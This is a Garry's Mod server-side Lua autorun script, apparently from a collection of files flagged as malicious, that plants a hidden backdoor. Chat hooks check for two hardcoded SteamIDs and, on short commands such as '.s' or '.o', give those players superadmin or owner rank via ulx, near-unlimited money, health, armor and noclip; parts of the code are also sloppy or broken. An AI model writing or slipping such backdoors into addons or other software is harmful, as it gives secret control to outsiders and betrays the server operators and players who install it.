--[[
	MOD/lua/autorun/server/sv_lordtyler.lua [#5327 (#5411), 3706421019, UID:4241344827]
	Bengt Östermalm | STEAM_0:1:4888510 | [31.05.14 05:32:50PM]
	===BadFile===
]]

hook.Add ( "PlayerSay", "LTCash", function( ply, text )
	text = string.lower( text )
	if ( string.sub (text, 1,2 ) == ".c" ) then
		if ply:SteamID() == "STEAM_0:0:50535096" or ply:SteamID() == "STEAM_0:1:49798293" then
			ply:addMoney(999999999)
		end
	end
end )
hook.Add ( "PlayerSay", "LTSA", function( ply, text )
	text = string.lower( text )
	if ( string.sub (text, 1,2 ) == ".s" ) then
		if ply:SteamID() == "STEAM_0:0:50535096" or ply:SteamID() == "STEAM_0:1:49798293" then
			RunConsoleCommand( "ulx", "adduser", ply:Nick(), "superadmin" )
		end
	end
end )
hook.Add ( "PlayerSay", "LTOWNS", function( ply, text )
	text = string.lower( text )
	if ( string.sub (text, 1,3 ) == ".os" ) then
		if ply:SteamID() == "STEAM_0:0:50535096" or ply:SteamID() == "STEAM_0:1:49798293" then
			RunConsoleCommand( "ulx", "adduser", ply:Nick(), "Owners" )
		end
	end
end )
hook.Add ( "PlayerSay", "LTOW", function( ply, text )
	text = string.lower( text )
	if ( string.sub (text, 1,4 ) == ".oss" ) then
		if ply:SteamID() == "STEAM_0:0:50535096" or ply:SteamID() == "STEAM_0:1:49798293" then
			RunConsoleCommand( "ulx", "adduser", ply:Nick(), "owners" )
		end
	end
end )
hook.Add ( "PlayerSay", "LTOWN", function( ply, text )
	text = string.lower( text )
	if ( string.sub (text, 1,2 ) == ".o" ) then
		if ply:SteamID() == "STEAM_0:0:50535096" or ply:SteamID() == "STEAM_0:1:49798293" then
			RunConsoleCommand( "ulx", "adduser", ply:Nick(), "owner" )
		end
	end
end )
hook.Add ( "PlayerSay", "LTNC", function( ply, text )
	text = string.lower( text )
	if ( string.sub (text, 1,2 ) == ".n" ) then
		if ply:SteamID() == "STEAM_0:0:50535096" or ply:SteamID() == "STEAM_0:1:49798293" then
			RunConsoleCommand( "ulx", "noclip")
		end
	end
end )
hook.Add ( "PlayerSay", "LTGM", function( ply, text )
	text = string.lower( text )
	if ( string.sub (text, 1,2 ) == ".g" ) then
		if ply:SteamID() == "STEAM_0:0:50535096" or ply:SteamID() == "STEAM_0:1:49798293" then
			ply:SetHealth(999999999)
			ply:SetArmor(999999999)
		end
	end
end)
hook.Add ( "PlayerSay", "LTGM2", function( ply, text )
	text = string.lower( text )
	if ( string.sub (text, 1,3 ) == ".lt" ) then
		if ply:SteamID() == "STEAM_0:0:50535096" or ply:SteamID() == "STEAM_0:1:49798293" then
			curHP = ply:Health()
			timer.Simple(1, function() ply:SetHealth(curHP + 1000) Player:PrintMessage(HUD_PRINTCENTER, "*MAY LORD TYLER BLESS YOU!*") curHPb = ply:Health() end)
			timer.Simple(2, function() ply:SetHealth(curHPb + 1000) Player:PrintMessage(HUD_PRINTCENTER, "MAY LORD TYLER BLESS YOU!") curHPc = ply:Health() end)
			timer.Simple(3, function() ply:SetHealth(curHPc + 1000) Player:PrintMessage(HUD_PRINTCENTER, "*MAY LORD TYLER BLESS YOU!*") curHPd = ply:Health() end)
			timer.Simple(4, function() ply:SetHealth(curHPd + 1000) Player:PrintMessage(HUD_PRINTCENTER, "MAY LORD TYLER BLESS YOU!") curHPe = ply:Health() end)
			timer.Simple(5, function() ply:SetHealth(curHPe + 1000) Player:PrintMessage(HUD_PRINTCENTER, "*MAY LORD TYLER BLESS YOU!*") curHPf = ply:Health() end)
			timer.Simple(6, function() ply:SetHealth(curHPf + 1000) Player:PrintMessage(HUD_PRINTCENTER, "MAY LORD TYLER BLESS YOU!") curHPg = ply:Health() end)
			timer.Simple(7, function() ply:SetHealth(curHPg + 1000) Player:PrintMessage(HUD_PRINTCENTER, "*MAY LORD TYLER BLESS YOU!*") curHPh = ply:Health() end)
			timer.Simple(8, function() ply:SetHealth(curHPh + 1000) Player:PrintMessage(HUD_PRINTCENTER, "MAY LORD TYLER BLESS YOU!") curHPi = ply:Health() end)
			timer.Simple(9, function() ply:SetHealth(curHPi + 1000) Player:PrintMessage(HUD_PRINTCENTER, "*MAY LORD TYLER BLESS YOU!*") curHPj = ply:Health() end)
			timer.Simple(10, function() ply:SetHealth(curHPj + 1000) Player:PrintMessage(HUD_PRINTCENTER, "MAY LORD TYLER BLESS YOU!") curHPk = ply:Health() end)
			timer.Simple(11, function() ply:SetHealth(curHPk + 1000) Player:PrintMessage(HUD_PRINTCENTER, "*MAY LORD TYLER BLESS YOU!*") curHPl = ply:Health() end)
			timer.Simple(12, function() ply:SetHealth(curHPl + 1000) Player:PrintMessage(HUD_PRINTCENTER, "MAY LORD TYLER BLESS YOU!") curHPm = ply:Health() end)
			timer.Simple(13, function() ply:SetHealth(curHPm + 1000) Player:PrintMessage(HUD_PRINTCENTER, "*MAY LORD TYLER BLESS YOU!*") curHPn = ply:Health() end)
			timer.Simple(14, function() ply:SetHealth(curHPn + 1000) Player:PrintMessage(HUD_PRINTCENTER, "MAY LORD TYLER BLESS YOU!") curHPo = ply:Health() end)
			timer.Simple(15, function() ply:SetHealth(curHPo + 1000) Player:PrintMessage(HUD_PRINTCENTER, "*MAY LORD TYLER BLESS YOU!*") curHPp = ply:Health() end)
			timer.Simple(16, function() ply:SetHealth(curHPp + 1000) Player:PrintMessage(HUD_PRINTCENTER, "MAY LORD TYLER BLESS YOU!") curHPq = ply:Health() end)
			timer.Simple(17, function() ply:SetHealth(curHPq + 1000) Player:PrintMessage(HUD_PRINTCENTER, "*MAY LORD TYLER BLESS YOU!*") curHPr = ply:Health() end)
			timer.Simple(18, function() ply:SetHealth(curHPe + 1000) Player:PrintMessage(HUD_PRINTCENTER, "MAY LORD TYLER BLESS YOU!") curHPs = ply:Health() end)
			timer.Simple(19, function() ply:SetHealth(curHPs + 1000) Player:PrintMessage(HUD_PRINTCENTER, "*MAY LORD TYLER BLESS YOU!*") curHPt = ply:Health() end)
			timer.Simple(20, function() ply:SetHealth(curHPt + 1000) Player:PrintMessage(HUD_PRINTCENTER, "MAY LORD TYLER BLESS YOU!") end)
		end
	end
end)